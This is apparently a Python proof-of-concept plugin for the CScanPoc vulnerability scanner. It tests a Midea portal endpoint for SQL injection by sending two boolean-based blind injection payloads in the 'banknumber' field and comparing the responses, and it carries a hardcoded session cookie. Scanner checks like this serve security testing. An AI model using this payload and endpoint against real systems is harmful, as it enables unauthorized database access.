# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Midea_0101'  # 平台漏洞编号
    name = '美的系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-24'  # 漏洞公布时间
    desc = '''
    美的系统SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=206992
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Midea'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9198c600-4b9a-453b-8574-8ee0838254a0'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "banknumber=B00%' AND 7212=7212 AND '%'=&page.currentPage=1&page.limitCount=10"
            payload1 = "banknumber=B00%' AND 7212=7211 AND '%'=&page.currentPage=1&page.limitCount=10"
            url = self.target + '/module-portalweb/portalweb/components/tangram/combo/popwin/query.shtml?cfgKey=bankInformation'
            headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "zh-cn",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
                "Content-Length": "52",
                "Connection": "Keep-Alive",
                "Cache-Control": "no-cache",
                "Cookie": "env=%7B%22channel%22%3A3%7D; midea_mk=fcc3e2b905070c8e34a0545e7b6f6486; Hm_lvt_94d2fcdc25bf11213329895f51da83d0=1462847016; Hm_lpvt_94d2fcdc25bf11213329895f51da83d0=1462847016; OAM_LANG_PREF=v1.0~cHJlZmVycmVkTGFuZ3VhZ2U9emh+ZGVmYXVsdExhbmd1YWdlTWFya2VyPWZhbHNl; oam_locale=zh; ObSSOCookie=loggedoutcontinue; _sna=VlRVVlBWXFRdVFRXVlxcXVZHBwwBCg4NAUcHDAEKDg0BR1VUVEdAOwoNCDtARw@@"
            }
            _response = requests.post(url, headers=headers, data=payload)
            _response1 = requests.post(url, headers=headers, data=payload1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
